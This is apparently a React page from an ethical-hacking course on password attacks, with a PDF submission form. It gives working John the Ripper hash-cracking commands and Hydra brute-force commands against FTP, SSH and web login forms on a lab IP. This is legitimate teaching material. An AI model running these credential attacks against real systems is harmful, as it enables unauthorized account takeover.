import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaArrowLeft,
  FaCode,
  FaList,
  FaLink,
  FaEdit,
  FaCheckCircle,
  FaRocket,
  FaBookOpen,
  FaLock,
} from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

const Dett7: React.FC = () => {
  const navigate = useNavigate();
  const { userData, userToken } = useAuth();

  // State for submission field
  const [submitted, setSubmitted] = useState(false);
  const [form, setForm] = useState({
    assignmentId: 7,
    userId: userData?.userDetails.id ?? "",
    fileUrl: "",
  });

  // Handle file upload for PDF submissions
  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && file.type === "application/pdf") {
      // Simulate file upload to a server (replace with actual upload logic)
      const fileUrl = URL.createObjectURL(file); // Temporary URL for demo
      setForm((prev) => ({
        ...prev,
        fileUrl: fileUrl,
      }));
    } else {
      alert("Please upload a valid PDF file.");
    }
  };

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Form Data:", form);

    if (!userToken) {
      alert("Authentication error. Please log in again.");
      return;
    }

    try {
      const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${userToken}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(form),
      });

      if (response.ok) {
        setSubmitted(true);
        alert("Assignment submitted successfully!");
      } else {
        const errorData = await response.json();
        alert(`Error: ${errorData.message}`);
      }
    } catch (error) {
      console.error("Error submitting assignment:", error);
      alert("Failed to submit. Please try again later.");
    }
  };

  return (
    <>
      <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
        {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
          className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105 p-2"
        >
          <FaArrowLeft className="mr-2 text-lg" />
          Back
        </button>

        {/* Section Heading */}
        <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center">
          <FaLock className="mr-3 text-2xl" />
          <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">Password Attacks</h1>
        </div>

        <div className="p-4 sm:p-6">
          {/* Introduction to Password Attacks */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
              <FaEdit className="mr-2 text-indigo-600" />
              Introduction to Password Attacks
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Password attacks aim to compromise user credentials, a common entry point for attackers due to weak passwords or poor security practices. Tools like John the Ripper and Hydra enable ethical hackers to test password strength by cracking hashes or performing brute-force attacks against services like SSH, FTP, or web logins. This module builds on exploitation basics from <code>Dett6</code>, focusing on offline and online password attacks. These skills are essential for Week 4’s network security audit and prepare students for real-world penetration testing and Capture The Flag (CTF) challenges.
            </p>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
              Mastering password attacks equips ethical hackers to identify and mitigate weak credentials, enhancing system security. All password cracking activities must be conducted in controlled lab environments with explicit permission to comply with legal and ethical standards, emphasizing the importance of responsible testing.
            </p>
          </div>

          {/* Understanding Password Attacks */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaCode className="mr-2 text-indigo-600" />
              Understanding Password Attacks
            </h2>
            <div className="space-y-6">
              {/* Types of Password Attacks */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  1. Types of Password Attacks
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Password attacks can be categorized based on their approach and target:
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li>
                    <strong>Offline Attacks:</strong> Crack password hashes extracted from a system (e.g., /etc/shadow) using tools like John the Ripper.
                  </li>
                  <li>
                    <strong>Online Attacks:</strong> Attempt to guess credentials against live services (e.g., SSH, FTP) using brute-force or dictionary attacks with tools like Hydra.
                  </li>
                  <li>
                    <strong>Dictionary Attacks:</strong> Use a wordlist of common passwords or phrases.
                  </li>
                  <li>
                    <strong>Brute-Force Attacks:</strong> Systematically try all possible combinations, slower but exhaustive.
                  </li>
                  <li>
                    <strong>Hybrid Attacks:</strong> Combine dictionary and brute-force methods, adding variations (e.g., appending numbers).
                  </li>
                </ul>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Example: Crack a stolen Linux hash offline with John or brute-force an FTP login online with Hydra.
                </p>
              </div>

              {/* John the Ripper: Offline Password Cracking */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  2. John the Ripper: Offline Password Cracking
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  John the Ripper is a powerful open-source tool for cracking password hashes, supporting formats like Linux (SHA-512), Windows (NTLM), and more. It uses dictionary, brute-force, and hybrid modes to recover passwords from hash files.
                </p>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Install John the Ripper on Kali Linux
sudo apt update
sudo apt install john

# Crack a Linux hash (e.g., from /etc/shadow)
# Example hash: user:$6$abc...xyz:18429:0:99999:7:::
sudo john --format=sha512crypt hash.txt

# Use a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt`}
                </pre>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Key features: Incremental mode for brute-forcing, custom rules for hybrid attacks, and support for GPU acceleration.
                </p>
              </div>

              {/* Hydra: Online Password Attacks */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  3. Hydra: Online Password Attacks
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Hydra is a versatile tool for online password attacks, targeting protocols like SSH, FTP, HTTP, and SMB. It performs brute-force or dictionary attacks against live services, testing credential combinations.
                </p>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Install Hydra on Kali Linux
sudo apt update
sudo apt install hydra

# Brute-force FTP login
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.20

# Brute-force SSH with username list
hydra -L users.txt -P passwords.txt ssh://192.168.56.20 -t 4

# Target HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`}
                </pre>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Options: <code>-t</code> controls parallel tasks, <code>-L</code>/<code>-P</code> specify user/password lists, and <code>-V</code> enables verbose output.
                </p>
              </div>

              {/* Password Security and Ethical Considerations */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  4. Password Security and Ethical Considerations
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Password attacks highlight the importance of strong credentials and ethical testing:
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li>
                    <strong>Strong Passwords:</strong> Use long, complex passwords (e.g., 12+ characters, mixed case, symbols) to resist cracking.
                  </li>
                  <li>
                    <strong>Password Policies:</strong> Enforce lockout mechanisms, multi-factor authentication (MFA), and regular password updates.
                  </li>
                  <li>
                    <strong>Authorization:</strong> Obtain explicit permission before attempting password attacks, even in labs.
                  </li>
                  <li>
                    <strong>Controlled Environment:</strong> Use isolated VMs to avoid impacting live systems or networks.
                  </li>
                  <li>
                    <strong>Responsible Reporting:</strong> Document findings and recommend stronger credentials or MFA in reports.
                  </li>
                  <li>
                    <strong>Legal Risks:</strong> Unauthorized password attacks can violate laws like the Computer Fraud and Abuse Act (CFAA).
                  </li>
                </ul>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Ethical hackers must balance testing rigor with legal and ethical boundaries, ensuring all actions are authorized and documented.
                </p>
              </div>
            </div>
          </div>

          {/* Practical Exercise */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaRocket className="mr-2 text-indigo-600" />
              Practical Exercise: Password Attacks with John the Ripper and Hydra
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Apply password attack skills by cracking a password hash offline with John the Ripper and performing an online attack against an FTP service with Hydra in a safe lab environment. Submit a PDF report documenting your process, results, and security recommendations.
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Set up two VMs in VirtualBox (Kali Linux: <code>192.168.56.10/24</code>, Ubuntu: <code>192.168.56.20/24</code>) using a Host-Only network (from <code>Dett6</code>).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                On the Ubuntu VM, install an FTP server (e.g., vsftpd) and create a user with a weak password (e.g., “password123”).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                On the Kali VM, install John the Ripper and Hydra.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Extract a password hash from the Ubuntu VM (e.g., simulate obtaining <code>/etc/shadow</code>) and save it to a file (e.g., <code>hash.txt</code>).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Use John the Ripper to crack the hash using a wordlist (e.g., <code>rockyou.txt</code>) and brute-force mode.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Use Hydra to perform a dictionary attack against the FTP service on <code>192.168.56.20</code>, targeting the known user.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Create a PDF report (200–300 words) detailing the cracking process, results (e.g., cracked passwords), and recommendations (e.g., enforce strong passwords, enable MFA).
              </li>
            </ul>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4">
              Here’s a starter guide for the lab:
            </p>
            <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
              {`# On Ubuntu VM (192.168.56.20)
# Install vsftpd
sudo apt update
sudo apt install vsftpd
# Create user with weak password
sudo useradd -m testuser
echo "testuser:password123" | sudo chpasswd
sudo systemctl start vsftpd

# On Kali VM (192.168.56.10)
# Install tools
sudo apt update
sudo apt install john hydra

# Simulate hash extraction (create hash.txt)
# Example hash: testuser:$6$abc...xyz:18429:0:99999:7:::
echo "testuser:\$6\$abc...xyz" > hash.txt

# Crack hash with John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=sha512crypt --incremental hash.txt
john --show hash.txt

# Brute-force FTP with Hydra
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.20 -t 4

# Create PDF report
# Use a text editor or reporting tool to document findings
`}
            </pre>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4 italic">
              Complete the exercise, test your setup, and submit your PDF report below!
            </p>
          </div>

          {/* PDF Submission */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaLink className="mr-2 text-indigo-600" />
              Submit Your Work
            </h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <label
                className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                htmlFor="fileUrl"
              >
                Upload Your PDF Report:
              </label>
              <input
                type="file"
                name="fileUrl"
                accept="application/pdf"
                className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                onChange={handleFileUpload}
              />
              <button
                type="submit"
                className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
              >
                Submit Exercise
              </button>
            </form>
            {submitted && (
              <p className="mt-4 text-green-600 font-medium flex items-center">
                <FaCheckCircle className="mr-2" />
                Your exercise has been submitted successfully!
              </p>
            )}
          </div>

          {/* Password Attacks Resources */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaBookOpen className="mr-2 text-indigo-600" />
              Password Attacks Resources
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Deepen your password attack skills with these resources:
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://www.openwall.com/john/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  John the Ripper - Official Documentation
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://github.com/openwall/john/blob/bleeding-jumbo/doc/MANUAL.md"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  John the Ripper - User Manual
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://tools.kali.org/password-attacks/hydra"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  Kali Linux - Hydra Documentation
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://www.hackingarticles.in/a-detailed-guide-on-hydra/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  Hacking Articles - Guide to Hydra
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://tryhackme.com/path/outline/passwordattacks"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  TryHackMe - Password Attacks Learning Path
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </>
  );
};

export default Dett7;